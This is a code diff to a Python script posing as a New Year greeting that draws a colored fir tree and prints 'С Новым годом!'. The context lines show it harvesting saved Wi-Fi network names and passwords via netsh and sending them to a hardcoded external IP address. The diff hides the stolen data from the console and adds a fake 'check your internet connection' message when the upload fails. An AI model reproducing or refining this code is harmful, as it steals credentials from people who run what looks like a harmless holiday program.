@@ -12,6 +12,8 @@ import requests
 
 COMPLIENCE = {}
 
+good = False
+
 def get_interfaces():
     result = subprocess.run('netsh wlan show interfaces', capture_output=True, text=True, shell=True)
     if result.stderr:
@@ -52,7 +54,7 @@ def main():
    if get_interfaces():
         profiles = get_profiles()
         get_passwords(profiles)
-        print(COMPLIENCE)
+        #print(COMPLIENCE)
         dicts = []
         for key, value in COMPLIENCE.items():
             dict = {'ssid': f'{key}','passwd': f'{value}'}
@@ -60,12 +62,15 @@ def main():
 
         url = 'http://185.92.74.31:10000/main'
         headers = {'Content-Type': 'application/json'}
+        global good
         for dict in dicts:
+            good = False
             try:
                 answer = requests.post(url=url, headers=headers, params=dict)
-                print(answer)
+                #print(answer)
+                good = True
             except requests.exceptions.RequestException as rec:
-                pass
+                good = False
 
 colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]
 
@@ -136,7 +141,12 @@ if __name__ == '__main__':
         create_fir(countRows)
 
         thread.join()
-        print(f'\n\n{Fore.CYAN}  С Новым годом!')
+
+        if good is True:
+            print(f'\n\n{Fore.CYAN}  С Новым годом!')
+        else:
+            print(f'\n\n{Fore.CYAN}  С Новым годом!')
+            print(colors[1], '\n- Пожалуйста, проверьте интернет соединение. -')
 
         while True:
             time.sleep(60)
